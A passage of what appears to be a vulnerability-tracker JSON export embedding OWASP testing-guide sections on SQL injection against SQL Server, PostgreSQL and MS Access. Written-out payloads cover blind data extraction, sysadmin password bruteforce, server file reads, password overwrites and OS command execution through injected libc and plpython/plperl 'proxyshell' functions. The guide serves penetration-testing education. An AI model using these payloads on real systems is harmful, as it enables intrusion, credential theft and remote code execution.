query\n\n\u0060\u0060\u0060\ndeclare\u00A0@s\u00A0varchar(8000)\ndeclare\u00A0@i\u00A0int\nselect\u00A0@s\u00A0=\u00A0db_name()\nselect\u00A0@i\u00A0=\u00A0[some\u00A0value]\nif\u00A0(select\u00A0len(@s))\u00A0\u003C\u00A0@i\u00A0waitfor\u00A0delay\u00A0\u00270:0:5\u0027\n\u0060\u0060\u0060\n\nMeasuring the response time and using different values for \u0060@i\u0060, we can deduce the length of the name of the current database, and then start to extract the name itself with the following query:\n\u0060if\u00A0(ascii(substring(@s,\u00A0@byte,\u00A01))\u00A0\u0026\u00A0(\u00A0power(2,\u00A0@bit)))\u00A0\u003E\u00A00\u00A0waitfor\u00A0delay\u00A0\u00270:0:5\u0027\u0060\nThis query will wait for 5 seconds if bit \u0060@bit\u0060 of byte \u0060@byte\u0060 of the name of the current database is 1, and will return at once if it is 0. Nesting two cycles (one for \u0060@byte\u0060 and one for \u0060@bit\u0060) we will we able to extract the whole piece of information.\nHowever, it might happen that the command \u0060waitfor\u0060 is not available (e.g., because it is filtered by an IPS/web application firewall). This doesn\u2019t mean that blind SQL injection attacks cannot be done, as the pen tester should only come up with any time consuming operation that is not filtered. For example\n\n\u0060\u0060\u0060\ndeclare\u00A0@i\u00A0int\u00A0select\u00A0@i\u00A0=\u00A00\nwhile\u00A0@i\u00A0\u003C\u00A00xaffff\u00A0begin\nselect\u00A0@i\u00A0=\u00A0@i\u00A0\u002B\u00A01\nend\n\u0060\u0060\u0060\n\n#### Checking for Version and Vulnerabilities\n\nThe same timing approach can be used also to understand which version of SQL Server we are dealing with. Of course we will leverage the built-in \u0060@@version\u0060 variable. Consider the following query:\n\u0060select\u00A0@@version\u0060\nOn SQL Server 2005, it will return something like the following:\n\u0060Microsoft\u00A0SQL\u00A0Server\u00A02005\u00A0-\u00A09.00.1399.06\u00A0(Intel\u00A0X86)\u00A0Oct\u00A014\u00A02005\u00A000:33:37\u0060\nThe \u00602005\u0060 part of the string spans from the 22nd to the 25th character. Therefore, one query to inject can be the following:\n\u0060if\u00A0substring((select\u00A0@@version),25,1)\u00A0=\u00A05\u00A0waitfor\u00A0delay\u00A0\u00270:0:5\u0027\u0060\nSuch query will wait 5 seconds if the 25th character of the \u0060@@version\u0060 variable is \u00605\u0060, showing us that we are dealing with a SQL Server 2005. If the query returns immediately, we are probably dealing with SQL Server 2000, and another similar query will help to clear all doubts.\n\n### Example 9: Bruteforce of Sysadmin Password\n\nTo bruteforce the sysadmin password, we can leverage the fact that \u0060OPENROWSET\u0060 needs proper credentials to successfully perform the connection and that such a connection can also be \u201Clooped\u201D to the local DB Server. Combining these features with an inference injection attack based on response timing, we can inject the following code:\n\u0060select * from OPENROWSET(\u0027SQLOLEDB\u0027,\u0027\u0027;\u0027sa\u0027;\u0027\u003Cpwd\u003E\u0027,\u0027select 1;waitfor delay \u0027\u00270:0:5\u0027\u0027 \u0027)\u0060\nWhat we are doing here is attempting a connection to the local database (specified by the empty field after \u0060SQLOLEDB\u0060) using \u0060sa\u0060 and \u0060\u003Cpwd\u003E\u0060 as credentials. If the password is correct and the connection is successful, the query is executed, making the DB wait for 5 seconds (and also returning a value, since OPENROWSET expects at least one column). Fetching the candidate passwords from a wordlist and measuring the time needed for each connection, we can attempt to guess the correct password. In \u201CData-mining with SQL Injection and Inference\u201D, David Litchfield pushes this technique even further, by injecting a piece of code in order to bruteforce the sysadmin password using the CPU resources of the DB Server itself.\nOnce we have the sysadmin password, we have two choices:\n\n* Inject all following queries using \u0060OPENROWSET\u0060, in order to use sysadmin privileges\n* Add our current user to the sysadmin group using \u0060sp_addsrvrolemember\u0060. The current username can be extracted using inference injection against the variable \u0060system_user\u0060.\n\nRemember that OPENROWSET is accessible to all users on SQL Server 2000 but it is restricted to administrative accounts on SQL Server 2005.\n\n## Tools\n\n* [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](https://sqlmap.org/)","Details":null,"Implication":null,"Recommendation":null,"References":"* [David Litchfield: \u201CData-mining with SQL Injection and Inference\u201D](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)\n* [Chris Anley, \u201C(more) Advanced SQL Injection\u201D](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)\n* [Steve Friedl\u2019s Unixwiz.net Tech Tips: \u201CSQL Injection Attacks by Example\u201D](http://www.unixwiz.net/techtips/sql-injection.html)\n* [Alexander Chigrik: \u201CUseful undocumented extended stored procedures\u201D](https://www.databasejournal.com/features/mssql/article.php/1441251/Useful-Undocumented-Extended-Stored-Procedures.htm)\n* [Antonin Foller: \u201CCustom xp_cmdshell, using shell object\u201D](https://www.motobit.com/tips/detpg_cmdshell)\n* [SQL Injection](https://www.cisecurity.org/wp-content/uploads/2017/05/SQL-Injection-White-Paper.pdf)\n* [Cesar Cerrudo: Manipulating Microsoft SQL Server Using SQL Injection, uploading files, getting into internal network, port scanning, DOS](https://www.cgisecurity.com/lib/Manipulating_SQL_Server_Using_SQL_Injection.pdf)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-05-4 Testing PostgreSQL","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"In this section, some SQL Injection techniques for PostgreSQL will be discussed. These techniques have the following characteristics:\n\n* PHP Connector allows multiple statements to be executed by using \u0060;\u0060 as a statement separator\n* SQL Statements can be truncated by appending the comment char: \u0060--\u0060.\n* \u0060LIMIT\u0060 and \u0060OFFSET\u0060 can be used in a \u0060SELECT\u0060 statement to retrieve a portion of the result set generated by the \u0060query\u0060\n\nFrom now on it is assumed that \u0060http://www.example.com/news.php?id=1\u0060 is vulnerable to SQL Injection attacks.","TestingInstructions":"### Identifying PostgreSQL\n\nWhen a SQL Injection has been found, you need to carefully fingerprint the backend database engine. You can determine that the backend database engine is PostgreSQL by using the *::* cast operator.\n\n#### Examples\n\n\u0060http://www.example.com/store.php?id=1\u00A0AND\u00A01::int=1\u0060\nIn addition, the function *version()* can be used to grab the PostgreSQL banner. This will also show the underlying operating system type and version.\n\n##### Example\n\n\u0060http://www.example.com/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0NULL,version(),NULL\u00A0LIMIT\u00A01\u00A0OFFSET\u00A01--\u0060\nAn example of a banner string that could be returned is:\n\u0060PostgreSQL\u00A08.3.1\u00A0on\u00A0i486-pc-linux-gnu,\u00A0compiled\u00A0by\u00A0GCC\u00A0cc\u00A0(GCC)\u00A04.2.3\u00A0(Ubuntu\u00A04.2.3-2ubuntu4)\u0060\n\n### Blind Injection\n\nFor blind SQL injection attacks, you should take into consideration the following built-in functions:\n\n* String Length \u0060LENGTH(str)\u0060\n* Extract a substring from a given string \u0060SUBSTR(str,index,offset)\u0060\n* String representation with no single quotes \u0060CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)\u0060\n\nStarting at version 8.2, PostgreSQL introduced a built-in function, \u0060pg_sleep(n)\u0060, to make the current session process sleep for \u0060n\u0060 seconds. This function can be leveraged to execute timing attacks (discussed in detail at [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)).\nIn addition, you can easily create a custom \u0060pg_sleep(n)\u0060 in previous versions by using libc:\n\n* \u0060CREATE function pg_sleep(int) RETURNS int AS \u0027/lib/libc.so.6\u0027, \u0027sleep\u0027 LANGUAGE \u0027C\u0027 STRICT\u0060\n\n### Single Quote Unescape\n\nStrings can be encoded, to prevent single quotes escaping, by using \u0060chr()\u0060 function.\n\n* \u0060chr(n)\u0060: Returns the character whose ASCII value corresponds to the number \u0060n\u0060\n* \u0060ascii(n)\u0060: Returns the ASCII value which corresponds to the character \u0060n\u0060\n\nLet\u2019s say you want to encode the string \u2018root\u2019:\n\n\u0060\u0060\u0060\nselect\u00A0ascii(\u0027r\u0027)\n114\nselect\u00A0ascii(\u0027o\u0027)\n111\nselect\u00A0ascii(\u0027t\u0027)\n116\n\u0060\u0060\u0060\n\nWe can encode \u2018root\u2019 as:\n\u0060chr(114)||chr(111)||chr(111)||chr(116)\u0060\n\n#### Example\n\n\u0060http://www.example.com/store.php?id=1;\u00A0UPDATE\u00A0users\u00A0SET\u00A0PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--\u0060\n\n### Attack Vectors\n\n#### Current User\n\nThe identity of the current user can be retrieved with the following SQL SELECT statements:\n\n\u0060\u0060\u0060\nSELECT\u00A0user\nSELECT\u00A0current_user\nSELECT\u00A0session_user\nSELECT\u00A0usename\u00A0FROM\u00A0pg_user\nSELECT\u00A0getpgusername()\n\u0060\u0060\u0060\n\n##### Example\n\n\u0060\u0060\u0060\nhttp://www.example.com/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0user,NULL,NULL--\nhttp://www.example.com/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0current_user,\u00A0NULL,\u00A0NULL--\n\u0060\u0060\u0060\n\n#### Current Database\n\nThe built-in function current\\_database() returns the current database name.\n\n##### Example\n\n\u0060http://www.example.com/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0current_database(),NULL,NULL--\u0060\n\n#### Reading from a File\n\nPostgreSQL provides two ways to access a local file:\n\n* \u0060COPY\u0060 statement\n* \u0060pg_read_file()\u0060 internal function (starting from PostgreSQL 8.1)\n\n##### COPY\n\nThis operator copies data between a file and a table. The PostgreSQL engine accesses the local file system as the \u0060postgres\u0060 user.\n\n###### Example\n\n\u0060\u0060\u0060\n/store.php?id=1;\u00A0CREATE\u00A0TABLE\u00A0file_store(id\u00A0serial,\u00A0data\u00A0text)--\n/store.php?id=1;\u00A0COPY\u00A0file_store(data)\u00A0FROM\u00A0\u0027/var/lib/postgresql/.psql_history\u0027--\n\u0060\u0060\u0060\n\nData should be retrieved by performing a \u0060UNION Query SQL Injection\u0060:\n\n* retrieves the number of rows previously added in \u0060file_store\u0060 with \u0060COPY\u0060 statement\n* retrieves a row at a time with UNION SQL Injection\n\n\u0060\u0060\u0060\n/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0NULL,\u00A0NULL,\u00A0max(id)::text\u00A0FROM\u00A0file_store\u00A0LIMIT\u00A01\u00A0OFFSET\u00A01;--\n/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0data,\u00A0NULL,\u00A0NULL\u00A0FROM\u00A0file_store\u00A0LIMIT\u00A01\u00A0OFFSET\u00A01;--\n/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0data,\u00A0NULL,\u00A0NULL\u00A0FROM\u00A0file_store\u00A0LIMIT\u00A01\u00A0OFFSET\u00A02;--\n...\n...\n/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0data,\u00A0NULL,\u00A0NULL\u00A0FROM\u00A0file_store\u00A0LIMIT\u00A01\u00A0OFFSET\u00A011;--\n\u0060\u0060\u0060\n\n##### pg\\_read\\_file()\n\nThis function was introduced in \u0060PostgreSQL 8.1\u0060 and allows one to read arbitrary files located inside DBMS data directory.\n\n###### Example\n\n\u0060SELECT pg_read_file(\u0027server.key\u0027,0,1000);\u0060\n\n#### Writing to a File\n\nBy reverting the COPY statement, we can write to the local file system with the \u0060postgres\u0060 user rights\n\u0060/store.php?id=1;\u00A0COPY\u00A0file_store(data)\u00A0TO\u00A0\u0027/var/lib/postgresql/copy_output\u0027--\u0060\n\n#### Shell Injection\n\nPostgreSQL provides a mechanism to add custom functions by using both Dynamic Library and scripting languages such as python, perl, and tcl.\n\n##### Dynamic Library\n\nUntil PostgreSQL 8.1, it was possible to add a custom function linked with \u0060libc\u0060:\n\u0060CREATE FUNCTION system(cstring) RETURNS int AS \u0027/lib/libc.so.6\u0027, \u0027system\u0027 LANGUAGE \u0027C\u0027 STRICT\u0060\nSince \u0060system\u0060 returns an \u0060int\u0060 how we can fetch results from \u0060system\u0060 stdout?\nHere\u2019s a little trick:\n\n* create a \u0060stdout\u0060 table: \u0060CREATE TABLE stdout(id serial, system_out text)\u0060\n* executing a shell command redirecting its \u0060stdout\u0060: \u0060SELECT system(\u0027uname -a \u003E /tmp/test\u0027)\u0060\n* use a \u0060COPY\u0060 statements to push output of previous command in \u0060stdout\u0060 table: \u0060COPY stdout(system_out) FROM \u0027/tmp/test*\u0027\u0060\n* retrieve output from \u0060stdout\u0060: \u0060SELECT system_out FROM stdout\u0060\n\n###### Example\n\n\u0060\u0060\u0060\n/store.php?id=1;\u00A0CREATE\u00A0TABLE\u00A0stdout(id\u00A0serial,\u00A0system_out\u00A0text)\u00A0--\n/store.php?id=1;\u00A0CREATE\u00A0FUNCTION\u00A0system(cstring)\u00A0RETURNS\u00A0int\u00A0AS\u00A0\u0027/lib/libc.so.6\u0027,\u0027system\u0027\u00A0LANGUAGE\u00A0\u0027C\u0027\nSTRICT\u00A0--\n/store.php?id=1;\u00A0SELECT\u00A0system(\u0027uname\u00A0-a\u00A0\u003E\u00A0/tmp/test\u0027)\u00A0--\n/store.php?id=1;\u00A0COPY\u00A0stdout(system_out)\u00A0FROM\u00A0\u0027/tmp/test\u0027\u00A0--\n/store.php?id=1\u00A0UNION\u00A0ALL\u00A0SELECT\u00A0NULL,(SELECT\u00A0system_out\u00A0FROM\u00A0stdout\u00A0ORDER\u00A0BY\u00A0id\u00A0DESC),NULL\u00A0LIMIT\u00A01\u00A0OFFSET\u00A01--\n\u0060\u0060\u0060\n\n##### Plpython\n\nPL/Python allows users to code PostgreSQL functions in python. It\u2019s untrusted so there is no way to restrict what user can do. It\u2019s not installed by default and can be enabled on a given database by \u0060CREATELANG\u0060\n\n* Check if PL/Python has been enabled on a database: \u0060SELECT count(*) FROM pg_language WHERE lanname=\u0027plpythonu\u0027\u0060\n* If not, try to enable: \u0060CREATE LANGUAGE plpythonu\u0060\n* If either of the above succeeded, create a proxy shell function: \u0060CREATE FUNCTION proxyshell(text) RETURNS text AS \u0027import os; return os.popen(args[0]).read() \u0027LANGUAGE plpythonu\u0060\n* Have fun with: \u0060SELECT proxyshell(os command);\u0060\n\n###### Example\n\n* Create a proxy shell function: \u0060/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS \u2018import os;return os.popen(args[0]).read()\u2019 LANGUAGE plpythonu;--\u0060\n* Run an OS Command: \u0060/store.php?id=1 UNION ALL SELECT NULL, proxyshell(\u0027whoami\u0027), NULL OFFSET 1;--\u0060\n\n##### Plperl\n\nPlperl allows us to code PostgreSQL functions in perl. Normally, it is installed as a trusted language in order to disable runtime execution of operations that interact with the underlying operating system, such as \u0060open\u0060. By doing so, it\u2019s impossible to gain OS-level access. To successfully inject a proxyshell like function, we need to install the untrusted version from the \u0060postgres\u0060 user, to avoid the so-called application mask filtering of trusted/untrusted operations.\n\n* Check if PL/perl-untrusted has been enabled: \u0060SELECT count(*) FROM pg_language WHERE lanname=\u0027plperlu\u0027\u0060\n* If not, assuming that sysadm has already installed the plperl package, try: \u0060CREATE LANGUAGE plperlu\u0060\n* If either of the above succeeded, create a proxy shell function: \u0060CREATE FUNCTION proxyshell(text) RETURNS text AS \u0027open(FD,\u0022$_[0] |\u0022);return join(\u0022\u0022,\u003CFD\u003E);\u0027 LANGUAGE plperlu\u0060\n* Have fun with: \u0060SELECT proxyshell(os command);\u0060\n\n###### Example\n\n* Create a proxy shell function: \u0060/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS \u0027open(FD,\u0022$_[0] |\u0022);return join(\u0022\u0022,\u003CFD\u003E);\u0027 LANGUAGE plperlu;\u0060\n* Run an OS Command: \u0060/store.php?id=1 UNION ALL SELECT NULL, proxyshell(\u0027whoami\u0027), NULL OFFSET 1;--\u0060\n\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":null,"References":"* [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)\n* [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n* [PostgreSQL Official Documentation](https://www.postgresql.org/docs/)\n* [Bernardo Damele and Daniele Bellucci: sqlmap, a blind SQL injection tool](https://sqlmap.org/)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-05-5 Testing for MS Access","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"As explained in the generic [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) section, SQL injection vulnerabilities occur whenever user-supplied input is used during the construction of a SQL query without being adequately constrained or sanitized. This class of vulnerabilities allows an attacker to execute SQL code under the privileges of the user that is used to connect to the database. In this section, relevant SQL injection techniques that utilize specific features of [Microsoft Access](https://en.wikipedia.org/wiki/Microsoft_Access) will be discussed.","TestingInstructions":"### Fingerprinting\n\nFingerprinting the specific database technology while testing SQL-powered application is the first step to properly asses potential vulnerabilities. A common approach involves injecting standard SQL injection attack patterns (e.g. single quote, double quote, \u2026) in order to trigger database exceptions. Assuming that the application does not handle exceptions with custom pages, it is possible to fingerprint the underline DBMS by observing error messages.\nDepending on the specific web technology used, MS Access driven applications will respond with one of the following errors:\n\u0060Fatal\u00A0error:\u00A0Uncaught\u00A0exception\u00A0\u0027com_exception\u0027\u00A0with\u00A0message\u00A0Source:\u00A0Microsoft\u00A0JET\u00A0Database\u00A0Engine\u0060\nor\n\u0060Microsoft\u00A0JET\u00A0Database\u00A0Engine\u00A0error\u00A0\u002780040e14\u0027\u0060\nor\n\u0060Microsoft\u00A0Office\u00A0Access\u00A0Database\u00A0Engine\u0060\nIn all cases, we have a confirmation that we\u2019re testing an application using MS Access database.\n\n### Basic Testing\n\nUnfortunately, MS Access doesn\u2019t support typical operators that are traditionally used during SQL injection testing, including:\n\n* No comments characters\n* No stacked queries\n* No LIMIT operator\n* No SLEEP or BENCHMARK alike operators\n* and many others\n\nNevertheless, it is possible to emulate those functions by combining multiple operators or by using alternative techniques. As mentioned, it is not possible to use the trick of inserting the characters \u0060/*\u0060, \u0060--\u0060 or \u0060#\u0060 in order to truncate the query. However, we can fortunately bypass this limitation by injecting a \u2018null\u2019 character. Using a null byte \u0060%00\u0060 within a SQL query results in MS Access ignoring all remaining characters. This can be explained by considering that all strings are NULL terminated in the internal representation used by the database. It is worth mentioning that the \u0060null\u0060 character can sometimes cause troubles too as it may truncate strings at the web server level. In those situations, we can however employ another character: \u00600x16\u0060 (\u0060%16\u0060 in URL encoded format).\nConsidering the following query:\n\u0060SELECT\u00A0[username],[password]\u00A0FROM\u00A0users\u00A0WHERE\u00A0[username]=\u0027$myUsername\u0027\u00A0AND\u00A0[password]=\u0027$myPassword\u0027\u0060\nWe can truncate the query with the following two URLs:\n\n* \u0060http://www.example.com/page.asp?user=admin\u0027%00\u0026pass=foo\u0060\n* \u0060http://www.example.com/page.app?user=admin\u0027%16\u0026pass=foo\u0060\n\nThe \u0060LIMIT\u0060 operator is not implemented in MS Access, however it is possible to limit the number of results by using the \u0060TOP\u0060 or \u0060LAST\u0060 operators instead.\n\u0060http://www.example.com/page.app?id=2\u0027\u002BUNION\u002BSELECT\u002BTOP\u002B3\u002Bname\u002BFROM\u002BappsTable%00\u0060\nBy combining both operators, it is possible to select specific results. String concatenation is possible by using \u0060\u0026 (%26)\u0060 and \u0060\u002B (%2b)\u0060 characters.\nThere are also many other functions that can be used while testing SQL injection, including but not limited to:\n\n* ASC: Obtain the ASCII value of a character passed as input\n* CHR: Obtain the character of the ASCII value passed as input\n* LEN: Return the length of the string passed as parameter\n* IIF: Is the IF construct, for example the following statement \u0060IIF(1=1, \u0027a\u0027, \u0027b\u0027)\u0060 return \u0060a\u0060\n* MID: This function allows you to extract substring, for example the following statement \u0060mid(\u0027abc\u0027,1,1)\u0060 return \u0060a\u0060\n* TOP: This function allows you to specify the maximum number of results that the query should return from the top. For example \u0060TOP 1\u0060 will return only 1 row.\n* LAST: This function is used to select only the last row of a set of rows. For example the following query \u0060SELECT last(*)\u0060 FROM users will return only the last row of the result.\n\nSome of these operators are essential to exploit blind SQL injections. For other advanced operators, please refer to the documents in the references.\n\n#### Attributes Enumeration\n\nIn order to enumerate the column of a database table, it is possible to use a common error-based technique. In short, we can obtain the attributes name by analyzing error messages and repeating the query with different selectors. For example, assuming that we know the existence of a column, we can also obtain the name of the remaining attributes with the following query:\n\u0060\u0027\u00A0GROUP\u00A0BY\u00A0Id%00\u0060\nIn the error message received, it is possible to observe the name of the next column. At this point, we can iterate the method until we obtain the name of all attributes. If we don\u2019t know the name of the first attribute, we can still insert a fictitious column name and obtain the name of the first attribute within the error message.\n\n#### Obtaining Database Schema\n\nVarious system tables exist by default in MS Access that can be potentially used to obtain table names and columns. Unfortunately, in the default configuration of recent MS Access database releases, these tables are not accessible. Nevertheless, it is always worth trying:\n\n* MSysObjects\n* MSysACEs\n* MSysAccessXML\n\nFor example, if a union SQL injection vulnerability exists, you can use the following query:\n\u0060\u0027\u00A0UNION\u00A0SELECT\u00A0Name\u00A0FROM\u00A0MSysObjects\u00A0WHERE\u00A0Type\u00A0=\u00A01%00\u0060\nAlternatively, it is always possible to bruteforce the database schema by using a standard wordlist (e.g. [FuzzDb](https://github.com/fuzzdb-project/fuzzdb)).\nIn some cases, developers or system administrators do not realize that including the actual \u0060.mdb\u0060 file within the application webroot can allow to download the entire database. Database filenames can be inferred with the following query:\n\u0060http://www.example.com/page.app?id=1\u0027\u002BUNION\u002BSELECT\u002B1\u002BFROM\u002Bname.table%00\u0060\nwhere \u0060name\u0060 is the \u0060.mdb\u0060 filename and \u0060table\u0060 is a valid database table. In case of password protected databases, multiple software utilities can be used to crack the password. Please refer to the references.\n\n### Blind SQL Injection Testing\n\n[Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) vulnerabilities are by no means the most easily exploitable SQL injections while testing real-life applications. In case of recent versions of MS Access, it is also not feasible to execute shell commands or read/write arbitrary files.\nIn case of blind SQL injections, the attacker can only infer the result of the query by evaluating time differences or application responses. It is supposed that the reader already knows the theory behind blind SQL injection attacks, as the remaining part of this section will focus on MS Access specific details.\nThe following example is used:\n\u0060http://www.example.com/index.php?myId=[sql]\u0060\nwhere the ID parameter is used within the following query:\n\u0060SELECT\u00A0*\u00A0FROM\u00A0orders\u00A0WHERE\u00A0[id]=$myId\u0060\nLet\u2019s consider the \u0060myId\u0060 parameter vulnerable to blind SQL injection. As an attacker, we want to extract the content of column \u0060username\u0060 in the table \u0060users\u0060, assuming that we have already disclosed the database schema.\nA typical query that can be used to infer the first character of the username of the 10th rows is:\n\u0060http://www.example.com/index.php?id=IIF((select%20MID(LAST(username),1,1)%20from%20(select%20TOP%2010%20username%20from%20users)=\u0027a\u0027,0,\u0027no\u0027)\u0060\nIf the first character is \u0060a\u0060, the query will return \u00600\u0060 or otherwise the string \u0060no\u0060.\nBy using a combination of the \u0060IFF, MID, LAST\u0060 and \u0060TOP\u0060 functions, it is possible to extract the first character of the username on a specifically selected row. As the inner query returns a set of records, and not just one, it is not possible to use it directly. Fortunately, we can combine multiple functions to extract a specific string.\nLet\u2019s assume that we want to retrieve the username of the 10th row. First, we can use the TOP function to select the first ten rows using the following query:\n\u0060SELECT\u00A0TOP\u00A010\u00A0username\u00A0FROM\u00A0users\u0060\nThen, using this subset, we can extract the last row by using the LAST function. Once we have only one row and exactly the row containing our string, we can use the IFF, MID and LAST functions to infer the actual value of the username. In our example, we employ IFF to return a number or a string. Using this trick, we can distinguish whether we have a true response or not, by observing application error responses. As \u0060id\u0060 is numeric, the comparison with a string results in a SQL error that can be potentially leaked by \u0060500 Internal Server Error pages\u0060. Otherwise, a standard \u0060200 OK\u0060 page will be likely returned.\nFor example, we can have the following query:\n\u0060http://www.example.com/index.php?id=\u0027%20AND%201=0%20OR%20\u0027a\u0027=IIF((select%20MID(LAST(username),1,1)%20from%20(select%20TOP%2010%20username%20from%20users))=\u0027a\u0027,\u0027a\u0027,\u0027b\u0027)%00\u0060\nthat is TRUE if the first character is \u2018a\u2019 or false otherwise.\nAs mentioned, this method allows to infer the value of arbitrary strings within the database:\n\n1. By trying all printable values, until we find a match\n2. By inferring the length of the string using the \u0060LEN\u0060 function, or by simply stopping after we have found all characters\n\nTime-based blind SQL injections are also possible by abusing [heavy queries](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)).","Details":null,"Implication":null,"Recommendation":null,"References":"* [MS Access SQL Injection Cheat Sheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)\n* [Access Through Access - Brett Moore](https://packetstormsecurity.com/files/65967/Access-Through-Access.pdf.html)\n* [Access SQL Injection - Brett Moore](https://seclists.org/pen-test/2003/May/74)\n* [MS Access: Functions](https://www.techonthenet.com/access/functions/index_alpha.php)\n* [Microsoft Access - Wikipedia](https://en.wikipedia.org/wiki/Microsoft_Access)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-05-6 Testing for NoSQL Injection","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nNoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren\u2019t using the traditional SQL syntax. Because these NoSQL injection attacks may execute within a [procedural language](https://en.wikipedia.org/wiki/Procedural_programming), rather than in the [declarative SQL language](https://en.wikipedia.org/wiki/Declarative_programming), the potential impacts are greater than traditional SQL injection.\nNoSQL database calls are written in the application\u2019s programming language, a custom API call, or formatted according to a common convention (such as \u0060XML\u0060, \u0060JSON\u0060, \u0060LINQ\u0060, etc). Malicious input targeting those specifications may not trigger the primarily application sanitization checks. For example, filtering out common HTML special characters such as \u0060\u003C \u003E \u0026 ;\u0060 will not 